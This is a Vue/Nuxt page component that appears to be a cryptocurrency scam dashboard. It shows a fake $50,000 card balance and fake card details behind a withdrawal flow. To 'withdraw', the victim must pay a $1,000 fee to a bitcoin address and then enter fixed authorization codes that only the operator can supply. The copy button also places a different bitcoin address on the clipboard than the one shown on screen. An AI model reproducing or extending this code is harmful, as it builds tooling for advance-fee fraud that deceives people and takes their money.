<template>
  <div>
    <!-- Loading Animation -->
    <div v-show="showLoading" class="animatedLoad" id="cereal"></div>
    
    <!-- Welcome Section -->
    <div class="welcomeNote">
      <h2>Welcome!</h2>
      <h3 class="showCardDetails" @click="toggleCardDetails">Show Card Details</h3>
    </div>
    
    <!-- Main Dashboard Content -->
    <div class="overallIn">
      <div class="balanceDiv">
        <h3>Total Balance:</h3>
        <h2 id="balance">{{ formatMoney(currentBalance) }}</h2>
        <hr>
        <div class="recentT">
          <h3>Recent Trx.</h3>
          
          <!-- Default transactions -->
          <div class="outliner">
            <div class="outlinee in"></div>
            <h3>$13,000.00</h3>
          </div>
          <div class="outliner">
            <div class="outlinee in"></div>
            <h3>$2,000.00</h3>
          </div>
          
          <!-- Dynamic transactions -->
          <div 
            v-for="(transaction, index) in recentTransactions" 
            :key="index"
            class="outliner"
          >
            <div :class="['outlinee', transaction.type === 'withdrawal' ? 'out' : 'in']"></div>
            <h3>{{ formatMoney(transaction.amount) }}</h3>
          </div>
          
          <!-- Withdrawal display -->
          <div v-show="showWithdrawal" class="outliner incomeAdded">
            <div class="outlinee out"></div>
            <h3>{{ formatMoney(withdrawnAmount) }}</h3>
          </div>
        </div>
      </div>
      
      <!-- Card Image/Details -->
      <div v-show="!showCardDetailsPanel" class="imageCard">
        <img src="/images/phonto-1.JPG" class="debitCard" alt="card image">
      </div>
      
      <div v-show="showCardDetailsPanel" class="contactForm cardDet">
        <p>Card Details</p>
        <h3>Card Number:</h3>
        <p>5174 2050 3256 7526</p>
        <h3>Expiration:</h3>
        <p>12/27</p>
        <h3>CVV:</h3>
        <p>147</p>
      </div>
    </div>

    <!-- Deposit/Withdraw Buttons -->
    <div v-show="showMainButtons" class="withdrawDeposit">
      <button class="ddepositng" @click="showDepositModal">Deposit</button>
      <button class="withdraw" @click="showWithdrawModal">Withdraw</button>
    </div>

    <!-- Withdrawal Form -->
    <div v-show="showWithdrawForm" class="contactForm" id="withrawalNote">
      <p>
        You're about to withdraw from your card balance, please select your wallet app.
      </p>
      <input 
        type="number" 
        v-model="withdrawAmount" 
        placeholder="Amount to withdraw" 
        min="0" 
        step="0.01"
        class="contactInput"
      >
      <select v-model="selectedWallet" class="contactInput">
        <option>Select Wallet App</option>
        <option>MetaMask</option>
        <option>Trust Wallet</option>
        <option>Coinbase</option>
        <option>Exodus</option>
        <option>Atomic</option>
        <option>Ledger Nano</option>
        <option>Bitcoin Core</option>
        <option>Phantom</option>
        <option>Binance</option>
        <option>Kucoin</option>
        <option>Bybit</option>
        <option>Luno</option>
        <option>Revolut</option>
        <option>Zengo</option>
        <option>Edge</option>
        <option>Blockchain</option>
        <option>Coinomi</option>
        <option>Guarda</option>
        <option>Enjin</option>
        <option>TokenPocket</option>
        <option>Math</option>
        <option>XDEFI</option>
        <option>Bitget</option>
        <option>Brave</option>
        <option>Unstoppable</option>
        <option>BlueWallet</option>
        <option>Muun</option>
        <option>Electrum</option>
        <option>My Ether</option>
        <option>Jaxx Liberty</option>
        <option>Blockchain</option>
        <option>COLDCARD Mk4</option>
        <option>Trezor Model T</option>
      </select>
      <button @click="proceedWithdrawal">Proceed</button>
      <div class="back">
        <h3 class="cancelWithraw" @click="cancelWithdrawal" style="cursor: pointer;"></h3>
      </div>
    </div>

    <!-- Email Confirmation -->
    <div v-show="showEmailConfirm" class="contactForm chargesDiv">
      <p>
        Please check your inbox of usdt*****@gmail.com for last confirmation
      </p>
    </div>

    <!-- Wallet Address Input -->
    <div v-show="showWalletInput" class="contactForm" id="pleasePay">
      <input 
        type="text" 
        v-model="walletAddress"
        class='walletAdd contactInput' 
        placeholder='Enter your wallet Address'
      >
      <button @click="confirmWalletAddress">Confirm</button>
    </div>

    <!-- Payment Processing Fee -->
    <div v-show="showPaymentFee" class="contactForm" id="pleasePay">
      <h3>This Withdrawal will attract a processing fee of $1,000. Make your payment into this bitcoin address</h3>
      <p class="mainCoin">bc1qjq2nchv7hrnp65l6z652wrphdna2dp3mu0hp7w</p>
      <p class="copyBut" @click="copyBitcoinAddress">Copy</p>
      <button @click="confirmPayment">Confirm</button>
    </div>

    <!-- Network Confirmation -->
    <div v-show="showNetworkConfirm" class="contactForm lastNote" id="processing">
      <h3>Please confirm that you're withdrawing on BTC network.. Mismatched address information may result to loss of assets</h3>
      <div class="contBack">
        <button class="cancelWith" @click="showAuthForm">Confirm</button>
      </div>
    </div>

    <!-- Email Code Input -->
    <div v-show="showCodeInput" class="contactForm" id="codeDiv">
      <h3>Please Input your email address to receive transaction code</h3>
      <input 
        type="number" 
        v-model="amountConfirm" 
        placeholder='Enter Amount Again'
        class="contactInput"
      >
      <input 
        type="email" 
        v-model="emailAddress" 
        placeholder='Enter Email Address'
        class="contactInput"
      >
      <p v-show="showCodeError" class="incorrectCode" style="color: red;">Error</p>
      <button @click="confirmCode">Confirm</button>
    </div>

    <!-- Authorization Form -->
    <div v-show="showAuthorizationForm" class="contactForm withdrawSuccess">
      <p>Check for the code and input below</p>
      <label for="authorizationCode">Authorization Code:</label>
      <input 
        type="text" 
        v-model="authCode" 
        placeholder="Enter Authorization Code"
        class="contactInput"
      >
      <label for="appcode">App Code:</label>
      <input 
        type="text" 
        v-model="appCode" 
        placeholder="Enter App Code"
        class="contactInput"
      >
      <button @click="confirmAuthCodes">Confirm</button>
      <p v-show="showAuthError" class="incorrectCodeTr" style="color: red;">{{ authErrorMessage }}</p>
    </div>

    <div class="withdrawSuc" v-if="showlastmessage">
        <p>
            Withdrawal Successful 
        </p>
        <p class="cancell" @click="clearLast">X</p>
    </div>

    <!-- Deposit Modal -->
    <div v-show="showDepositForm" class="contactForm depp">
      <p>Please make your deposit on this wallet address <br> bc1qjq2nchv7hrnp65l6z652wrphdna2dp3mu0hp7w</p>
      <p class="cancelDeposit" @click="closeDepositModal" style="cursor: pointer; color: red;">X</p>
    </div>

    <!-- Footer -->
    <div class="footerDash">
      <div class="secondShift">
        <div class="innerOne">
          <h3>Quick Links</h3>
          <a href="#">Products</a>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, computed } from 'vue'


    definePageMeta({
      layout: false
    })
// Reactive data
const showlastmessage = ref(false)
const currentBalance = ref(50000.00)
const withdrawAmount = ref('')
const withdrawnAmount = ref(0)
const selectedWallet = ref('Select Wallet App')
const walletAddress = ref('')
const authCode = ref('')
const appCode = ref('')
const amountConfirm = ref('')
const emailAddress = ref('')
const authErrorMessage = ref('')

// Transaction history
const transactions = ref([])

// UI state
const showLoading = ref(false)
const showCardDetailsPanel = ref(false)
const showWithdrawal = ref(false)
const showWithdrawForm = ref(false)
const showEmailConfirm = ref(false)
const showWalletInput = ref(false)
const showPaymentFee = ref(false)
const showNetworkConfirm = ref(false)
const showCodeInput = ref(false)
const showAuthorizationForm = ref(false)
const showCodeError = ref(false)
const showAuthError = ref(false)
const showDepositForm = ref(false)
const showMainButtons = ref(true)

const clearLast = () => {
 showlastmessage.value = false

}

// Computed
const recentTransactions = computed(() => {
  return transactions.value.slice(-5).reverse()
})

// Methods
const formatMoney = (amount) => {
  return '$' + amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,')
}

const saveBalance = (amount) => {
  if (process.client) {
    localStorage.setItem('currentBalancesss', amount.toString())
  }
}

const saveTransaction = (amount, type) => {
  const newTransaction = {
    amount: amount,
    type: type,
    date: new Date().toISOString()
  }
  transactions.value.push(newTransaction)
  
  if (process.client) {
    localStorage.setItem('transactionsss', JSON.stringify(transactions.value))
  }
}

const loadTransactionHistory = () => {
  if (process.client) {
    const stored = localStorage.getItem('transactionsss')
    if (stored) {
      transactions.value = JSON.parse(stored)
    }
  }
}

const loadBalance = () => {
  if (process.client) {
    const stored = localStorage.getItem('currentBalancesss')
    if (stored) {
      currentBalance.value = parseFloat(stored)
    }
  }
}

// UI Methods
const toggleCardDetails = () => {
  showCardDetailsPanel.value = !showCardDetailsPanel.value
}

const showWithdrawModal = () => {
  showWithdrawForm.value = true
  showMainButtons.value = false
}

const cancelWithdrawal = () => {
  showWithdrawForm.value = false
  showMainButtons.value = true
}

const proceedWithdrawal = () => {
  if (!withdrawAmount.value) {
    alert('No amount entered')
    return
  }
  if (selectedWallet.value === 'Select Wallet App') {
    alert('Please Select a Wallet App')
    return
  }
  
  showWithdrawForm.value = false
  showWalletInput.value = true
}

const confirmWalletAddress = () => {
  showWalletInput.value = false
  showNetworkConfirm.value = true
}

const confirmPayment = () => {
  showPaymentFee.value = false
  showNetworkConfirm.value = true
}

const showAuthForm = () => {
  showNetworkConfirm.value = false
  showCodeInput.value = true
}

const confirmCode = () => {
  showCodeInput.value = false
  showAuthorizationForm.value = true
}

const confirmAuthCodes = () => {
  if (authCode.value === '4htuos4' && appCode.value === 'sTostU09d') {
    showLoading.value = true
    setTimeout(() => {
      processWithdrawal()
      showAuthorizationForm.value = false
      showLoading.value = false
       showlastmessage.value = false
       showlastmessage.value = true
      showMainButtons.value = true
    }, 1500)
  } else if (!authCode.value || authCode.value !== '4htuos4') {
    showAuthError.value = true
    authErrorMessage.value = 'Enter Correct Authorization code'
    setTimeout(() => {
      showAuthError.value = false
    }, 1500)
  } else if (!appCode.value || appCode.value !== 'sTostU09d') {
    showAuthError.value = true
    authErrorMessage.value = 'Enter Correct App code'
    setTimeout(() => {
      showAuthError.value = false
    }, 1500)
  }
}

const processWithdrawal = () => {
  const amount = parseFloat(withdrawAmount.value)
  
  if (isNaN(amount) || amount <= 0) {
    return
  }
  
  if (amount > currentBalance.value) {
    alert("Insufficient funds!")
    return
  }
  
  currentBalance.value -= amount
  withdrawnAmount.value = amount
  showWithdrawal.value = true
  
  saveBalance(currentBalance.value)
  saveTransaction(amount, 'withdrawal')
  
  // Reset form
  withdrawAmount.value = ''
  selectedWallet.value = 'Select Wallet App'
  walletAddress.value = ''
  authCode.value = ''
  appCode.value = ''
}

const copyBitcoinAddress = async () => {
  try {
    await navigator.clipboard.writeText('bc1qu4xz47r0v33vlak75g3np8raz0w4cru0u6fg28')
    // You can add a toast notification here
  } catch (err) {
    console.error('Failed to copy: ', err)
  }
}

const showDepositModal = () => {
  showDepositForm.value = true
}

const closeDepositModal = () => {
  showDepositForm.value = false
}

// Lifecycle
onMounted(() => {
  loadBalance()
  loadTransactionHistory()
})

// Head configuration for Nuxt
useHead({
  title: 'Dashboard',
  meta: [
    { name: 'viewport', content: 'width=device-width, initial-scale=1.0' }
  ]
})
</script>

<style scoped>
.cancell{
    background: red;
    width: 20px;
    cursor: pointer;
}
.withdrawSuc{
    text-align: center;
    background: green;
    color: white;
    padding: 5px;
        display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 10px;
    z-index: 10;
}
/* CONTACT PAGE */
#ContactSubmit{
    border: none;
    border-radius: 0 0 0 0;
    background-color: #2aaeda;
}
#ContactSubmit:hover{
    color: #2aaeda;
    background-color: whitesmoke;
}
textarea{
    height: 100px;
    width: 300px;
    padding: 8px;
    box-shadow: inset 10px 6px 50px rgb(192, 192, 196);
    border: none;
    outline: none;
    font-size: 18px;
}
.contactForm{
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 10px;
    background-color: #6897a7;
    margin: 10px;
    padding: 20px;
    border-radius: 10px;
    box-shadow: inset 10px 6px 50px rgb(26, 49, 195);
}
.contactForm h3{
    text-align: center;
    color: white;
    font-size: 25;
}
.contactInput{
    width: 300px;
    border-radius: 10px;
    height: 35px;
    border: none;
    padding: 4px;
    outline: none;
    box-shadow: inset 10px 6px 50px rgb(192, 192, 196);
}

.overallIn{
    display: flex;
    padding: 5px;
    /* align-items: center; */
    justify-content: space-between;
}

.contactForm>p{
    text-align: center;
    font-size: 17px;
    color: #cbda2a;
}
.balanceDiv>h2{
    color: black;
}

.withdrawDeposit{
    display: flex;
    gap: 5px;
    margin: 5px;
}
.deposit{
    background-color: green;
}
.withdraw{
    background-color: rgb(128, 0, 0);
}

.outlinee{
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background-color: green;
}
.outlineer{
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 24px;
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background-color: green;
}
.outliner{
    display: flex;
    /* justify-content: center; */
    align-items: center;
    gap: 10px;
}
.in{
    background-color: green;
}
.out{
    background-color: rgb(128, 0, 0);
}

.welcomeNote{
    display: flex;
    color: white;
    justify-content: space-between;
    align-items: center;
    margin: 10px;
}

.footerDash{
    display: flex;
    justify-content: space-between;
    margin: 0 10px;
    position: absolute;
    bottom: 0;
    /* align-items: center; */
}
.innerOne{
    display: flex;
    /* align-items: center; */
    flex-direction: column;
    gap: 10px;
}

.firstshift{
    display: flex;
    flex-direction: column;
    /* gap: 10px; */
}
.firstshift>h3{
    color: #cbda2a;;
}
.apartment{
    display: flex;
    /* gap: 10px; */
}
.innerInner{
    display: flex;
    gap: 10px;
    flex-direction: column;
    width: 170px;
    padding: 10px;
}
.innerInner>h3{
    color: #cbda2a;;
}
.recentT>h3{
    color: white;
    font-size: 21.5px;
    padding: 10px 0;
}

#pleasePay{
    position: absolute;
    top: 200px;
    left: 0;
    margin-left: 0;
    padding: 10px;
    width: 100%;
}
.mainCoin{
    font-size: 5px;
}
.deleter{
    font-size: 20px;
    color: red;
    cursor: pointer;
}
.conCopy{
    display: flex;
    flex-direction: column;
    gap: 10px;
    justify-content: center;
    align-items: center;
    color: white;
}
.copyBut{
    border: 2px solid white;
    padding: 5px;
    background-color: rgb(150, 136, 56);
    border-radius: 20px;
    cursor: pointer;
}

.walletCopied{
    position: absolute;
    top: 200px;
}
#withrawalNote{
    position: absolute;
    top: 150px;
}

.debitCard{
    transform: rotate(90deg);
    width: 200px;
    margin: 30px 0;
}
.welcomeNote>h3{
    color: white;
    cursor: pointer;
}
.contBack{
    display: flex;
    gap: 5px;
}
button{
    width: 100px;
    background-color:  rgb(128, 0, 0);
    font-size: 15px;
    border: 3px solid white;
    padding: 5px;
    height: 30px;
    border-radius: 30px;
    color: white;
    cursor: pointer;
}
</style>